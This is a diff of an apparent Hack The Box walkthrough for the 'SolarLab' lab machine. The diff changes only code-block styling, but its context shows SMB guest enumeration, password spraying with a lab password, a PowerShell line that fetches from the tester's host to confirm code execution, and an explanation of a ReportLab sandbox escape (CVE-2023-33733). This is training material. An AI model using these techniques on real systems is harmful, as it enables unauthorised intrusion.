@@ -250,7 +250,7 @@
 <ul>
 <li>
 <p><strong>Basic TCP Scan</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>nmap $box -Pn -oA TCPbasicScan
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Results</span>
@@ -284,7 +284,7 @@
 <ul>
 <li>
 <p><strong>In depth scan TCP</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Results</span>
@@ -342,7 +342,7 @@
 <h3 id="smb-445">SMB <code>445</code>:</h3>
 <h4 id="attempting-to-connect-with-null-and-guest-sessions">Attempting to connect with NULL &amp; Guest sessions:</h4>
 <p><strong>This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
 </span></span></code></pre></div><p>As we can see we can authenticate using the <code>guest</code> account and access the <code>Documents</code> &amp; <code>IP$</code> share. We can also see that null sessions have been disables.</p>
@@ -354,7 +354,7 @@
 </ul>
 <h4 id="enumerating-users-with-impacket-lookupsid">Enumerating Users with Impacket-lookupsid:</h4>
 <p>As RPC is running I try and run <code>impacket-lookupsid</code> to dump any usernames however it doesn&rsquo;t seem to work so will need to come back to this.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-lookupsid guest@$box -domain-sids -no-pass
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-lookupsid guest@$box -domain-sids -no-pass
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-13-070509_.png">
 </figure>
@@ -368,7 +368,7 @@
 </ul>
 <h4 id="using-smbclient">Using smbclient:</h4>
 <p>We can connect to the share using <code>smbclient</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smbclient -U <span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#e6db74">&#34;\\\\</span>$box<span style="color:#e6db74">\\[Share]&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smbclient -U <span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#e6db74">&#34;\\\\</span>$box<span style="color:#e6db74">\\[Share]&#34;</span>
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-13-065453_.png">
 </figure>
@@ -382,7 +382,7 @@
 </li>
 <li>
 <p>Run the following commands from within the SMB shell.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>RECURSE ON
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>RECURSE ON
 </span></span><span style="display:flex;"><span>PROMPT OFF
 </span></span><span style="display:flex;"><span>mget *
 </span></span></code></pre></div><ul>
@@ -418,7 +418,7 @@
 </ul>
 <h3 id="finding-valid-creds-by-password-spraying">Finding Valid Creds By Password Spraying:</h3>
 <p>Now that we have the passwords and usersnames we can cred stuff using <code>netexec</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u Users.txt -p Passwords.txt --continue-on-success | grep <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u Users.txt -p Passwords.txt --continue-on-success | grep <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>
 </span></span></code></pre></div><p>We get a hit for <code>blake</code> and one of the found passwords</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-13-073814_.png">
@@ -437,7 +437,7 @@
 <p>Basically, we could put in any random username and text and if we got the <code>Guest</code> response it would tell us the guest account is enabled.</p>
 <h3 id="accessing-the-host-as-blake">Accessing the Host As Blake:</h3>
 <p>First lets store our username &amp; creds in variables to make things a little easier.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>user<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;blake&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>user<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;blake&#39;</span>
 </span></span><span style="display:flex;"><span>pass<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ThisCanB3typedeasily1@&#39;</span>
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-13-074411_.png">
@@ -460,7 +460,7 @@
 <ul>
 <li>
 <p>Lets run &ldquo;whatWeb&rdquo; to see if I can glean some further information:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>whatweb http://$box | sed <span style="color:#e6db74">&#39;s/, /\n/g&#39;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Output</span>
@@ -501,7 +501,7 @@
 </li>
 </ul>
 <h5 id="against-report-dot-solarlab-dot-htb-6791">Against <code>report.solarlab.htb:6791</code>:</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>whatweb http://report.solarlab.htb:6791 | sed <span style="color:#e6db74">&#39;s/, /\n/g&#39;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Results</span>
@@ -573,7 +573,7 @@
 <ul>
 <li>
 <p>First against the base webserver running <code>80</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>feroxbuster -u http://$box:80 --threads <span style="color:#ae81ff">20</span> --scan-limit <span style="color:#ae81ff">2</span> -q -r -o $domain-FeroxScan.txt
 </span></span></code></pre></div><ul>
 <li>There is nothing of note.</li>
@@ -589,10 +589,10 @@
 </ul>
 <h5 id="on-http-report-dot-solarlab-dot-htb-6791">On <a href="http://report.solarlab.htb:6791/"  target="_blank" rel="noreferrer nofollow">http://report.solarlab.htb:6791/</a>
 </h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>feroxbuster -u http://report.solarlab.htb:6791 --threads <span style="color:#ae81ff">20</span> --scan-limit <span style="color:#ae81ff">2</span> -q -r -o $domain-FeroxScan.txt
 </span></span></code></pre></div><p>Nothing of note, I actually re-run using ffuf and get a few standard endpoints:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://report.$domain:6791/FUZZ -fc <span style="color:#ae81ff">403</span> -ic
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://report.$domain:6791/FUZZ -fc <span style="color:#ae81ff">403</span> -ic
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-13-093345_.png">
 </figure>
@@ -601,13 +601,13 @@
 <h3 id="web-6791">Web <code>6791</code></h3>
 <h3 id="enumerating-users-as-blake">Enumerating Users As Blake:</h3>
 <p>I have been stuck for a little while on this, initially I tried to enumerate users as blake using the standard way like the below however this did not work.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/Boxes/BlogEntriesMade/SolarLab/scans  🍣 main 📝 ×219 4GiB/7GiB | 2MiB/1GiB with /usr/bin/zsh
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/Boxes/BlogEntriesMade/SolarLab/scans  🍣 main 📝 ×219 4GiB/7GiB | 2MiB/1GiB with /usr/bin/zsh
 </span></span><span style="display:flex;"><span>🕙 09:15:52 zsh ❯ netexec smb $box -u $user -p $pass --users
 </span></span><span style="display:flex;"><span>SMB         10.129.231.39   <span style="color:#ae81ff">445</span>    SOLARLAB         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">19041</span> x64 <span style="color:#f92672">(</span>name:SOLARLAB<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:solarlab<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>SMB         10.129.231.39   <span style="color:#ae81ff">445</span>    SOLARLAB         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> solarlab<span style="color:#ae81ff">\b</span>lake:ThisCanB3typedeasily1@
 </span></span><span style="display:flex;"><span>SMB         10.129.231.39   <span style="color:#ae81ff">445</span>    SOLARLAB         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Account not found in the BloodHound database.
 </span></span></code></pre></div><p>However we can also bruteforce the RID&rsquo;s using netexec/crackmap&rsquo;s built in <code>--rid-brute</code> module and I found another users, <code>openfire</code>, I add this to my list of users.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -p $pass --rid-brute
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -p $pass --rid-brute
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-13-091924_.png">
 </figure>
@@ -634,7 +634,7 @@
 </li>
 </ul>
 <p>I add the following entries to my username list, however these also give me no hits.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>blake.helena
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>blake.helena
 </span></span><span style="display:flex;"><span>helena
 </span></span></code></pre></div><p>Looking at the other users names we can see that they following the convention(s) of</p>
 <ul>
@@ -642,7 +642,7 @@
 <li>firstname:firstinitialoflastname e.g &ldquo;AlexanderK&rdquo; &amp; &ldquo;ClaudiaS&rdquo;</li>
 </ul>
 <p>I add the following entries to my username list, ensuring to cover Blake&rsquo;s listed name as well as mothers maiden name.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>BByte
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>BByte
 </span></span><span style="display:flex;"><span>HByte
 </span></span><span style="display:flex;"><span>BlakeH
 </span></span><span style="display:flex;"><span>BlakeB
@@ -698,7 +698,7 @@ If we look at another response from this attack we can see two things, first it&
 <p>The first thing that strikes me is that the justification box has the ability to enter code, this coupled with the fact that the contents of the justification box has to be processed when generating a PDF leads me to believe we could potentially get code execution this way.</p>
 <h3 id="trying-to-get-rce-in-reporthub">Trying to get RCE in ReportHub:</h3>
 <p>I create a code box in the pdf generator and enter the below. I also start a python web server.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell -Command <span style="color:#e6db74">&#34;(new-object net.webclient).DownloadString(&#39;http://10.10.14.20:9000/test&#39;)&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell -Command <span style="color:#e6db74">&#34;(new-object net.webclient).DownloadString(&#39;http://10.10.14.20:9000/test&#39;)&#34;</span>
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-14-063221_.png">
 </figure>
@@ -712,7 +712,7 @@ If we look at another response from this attack we can see two things, first it&
 </ul>
 <h3 id="discovering-reportlab-is-being-used">Discovering ReportLab is being used:</h3>
 <p>Running <code>exiftool</code> on the downloaded pdf shows us that it&rsquo;s using the ReportLab PDF library</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>exiftool output.pdf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>exiftool output.pdf
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-17-080042_.png">
 </figure>
@@ -741,13 +741,13 @@ If we look at another response from this attack we can see two things, first it&
 <p>First of all, what is <code>eval()</code> and what does it do?</p>
 <p><code>eval()</code> takes text and runs it as Python code.</p>
 <p>Here is a simple Example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>eval(<span style="color:#e6db74">&#34;2 + 2&#34;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>eval(<span style="color:#e6db74">&#34;2 + 2&#34;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Runs this as code, gives 4</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>eval(<span style="color:#e6db74">&#34;print (&#39;hello world&#39;)&#34;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Run this and it will print hello world</span>
 </span></span></code></pre></div><p>Bad guys love <code>eval()</code> because it allows the running of os level commands like the below by using the <code>os</code> module</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>eval(<span style="color:#e6db74">&#34;__import__(&#39;os&#39;).system(&#39;calc.exe&#39;)&#34;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>eval(<span style="color:#e6db74">&#34;__import__(&#39;os&#39;).system(&#39;calc.exe&#39;)&#34;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># This will open Calculator on Windows!</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>eval(<span style="color:#e6db74">&#34;__import__(&#39;os&#39;).system(&#39;/usr/bin/firefox -browser http://google.com&#39;)&#34;</span>)
@@ -802,7 +802,7 @@ If we look at another response from this attack we can see two things, first it&
 <ol>
 <li>
 <p>It enables us to query what class an object is, this is done by passing it a single argument like below.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> type(<span style="color:#ae81ff">1</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> type(<span style="color:#ae81ff">1</span>)
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">int</span><span style="color:#e6db74">&#39;&gt;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> type(<span style="color:#e6db74">&#34;s&#34;</span>)
@@ -822,7 +822,7 @@ If we look at another response from this attack we can see two things, first it&
 </span></span></code></pre></div></li>
 <li>
 <p>It enables us to create objects/classes dynamically on the fly by passing it 3 arguments.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Define a simple method for our class</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Define a simple method for our class</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">say_hello</span>(self, name):
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Hello, </span><span style="color:#e6db74">{</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">!&#34;</span>
 </span></span><span style="display:flex;"><span>
@@ -861,14 +861,14 @@ If we look at another response from this attack we can see two things, first it&
 <p>So why am I explaining this all, well if we can access <code>type()</code> and pass it 3 arguments we can create classes on the fly to access functionality we should not be able to access in the restricted environment.</p>
 <h4 id="escaping-sand-boxed-type-function">Escaping Sand-boxed <code>type()</code> function:</h4>
 <p>In the sandbox, a fake <code>type()</code> class (below) is used,to prevent us being able to use the original in-built version of <code>type()</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__rl_type__</span>(self, <span style="color:#f92672">*</span>args):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__rl_type__</span>(self, <span style="color:#f92672">*</span>args):
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(args) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>: <span style="color:#66d9ef">return</span> type(<span style="color:#f92672">*</span>args)
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> BadCode(<span style="color:#e6db74">&#39;type call error&#39;</span>)
 </span></span></code></pre></div><p>In this restricted version of type only one argument can be passed, and if more than one argument is passed it will return <code>BadCode 'type call error'</code> which means it cannot be used to create classes…..or can it.</p>
 <h4 id="using-the-restricted-type-to-access-original-type">Using the restricted <code>type()</code> to access original <code>type()</code>:</h4>
 <p>So here is the amazing workaround <a href="https://github.com/c53elyas/CVE-2023-33733"  target="_blank" rel="noreferrer nofollow">c53elyas</a>
  found! We can use the fake <code>type</code> to recover the original real <code>type</code> by using the below line.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>type(type(<span style="color:#ae81ff">1</span>))
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>type(type(<span style="color:#ae81ff">1</span>))
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># This resturns the original &lt;class &#39;type&#39;&gt;</span>
 </span></span></code></pre></div><p><strong>Step by step of why this is so clever &amp; how it works</strong>:</p>
 <ol>
@@ -886,15 +886,15 @@ If we look at another response from this attack we can see two things, first it&
 </li>
 </ol>
 <p>Which means <code>type(type(1))</code> gives us the real, original Python type class! So if we can call it, it means we can also store it in a variable like below. So when we call <code>orgTypeFun</code> we are calling <code>type()</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>orgTypeFun <span style="color:#f92672">=</span> type(type(<span style="color:#ae81ff">1</span>))
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>orgTypeFun <span style="color:#f92672">=</span> type(type(<span style="color:#ae81ff">1</span>))
 </span></span></code></pre></div><p>So this means, if we can call the original <code>type()</code> class we can now use it to create new classes objects dynamically!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Word <span style="color:#f92672">=</span> orgTypeFun(<span style="color:#e6db74">&#39;Word&#39;</span>, (str,), {<span style="color:#f92672">...</span>})
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Word <span style="color:#f92672">=</span> orgTypeFun(<span style="color:#e6db74">&#39;Word&#39;</span>, (str,), {<span style="color:#f92672">...</span>})
 </span></span></code></pre></div><p>In the simple terms:</p>
 <ul>
 <li>We used their limited tool to grab the real tool hidden inside Python itself!</li>
 </ul>
 <p>Simple Diagram explaining the process for those learn better visually</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[ sandboxed type() ]
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[ sandboxed type() ]
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">|</span>
 </span></span><span style="display:flex;"><span>        v
 </span></span><span style="display:flex;"><span>  type(<span style="color:#ae81ff">1</span>) <span style="color:#960050;background-color:#1e0010">————</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">int</span><span style="color:#e6db74">&#39;&gt;</span>
@@ -908,19 +908,19 @@ If we look at another response from this attack we can see two things, first it&
 </span></span></code></pre></div><h4 id="step-2-make-a-fake-class--called-word--to-trick-checks">Step 2: Make a fake class (called Word) to trick checks:</h4>
 <p>The sandboxed version of <code>eval()</code> in ReportLab tries to block access to dangerous attributes like <code>__globals__, __code__</code>, etc.</p>
 <p>So whenever we try to use <code>getattr(obj, name)</code>, it checks:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> name<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;__&#39;</span>):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> name<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;__&#39;</span>):
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> BadCode(<span style="color:#e6db74">&#34;Unsafe access&#34;</span>)
 </span></span></code></pre></div><p>This is intended to stop us from doing something like:</p>
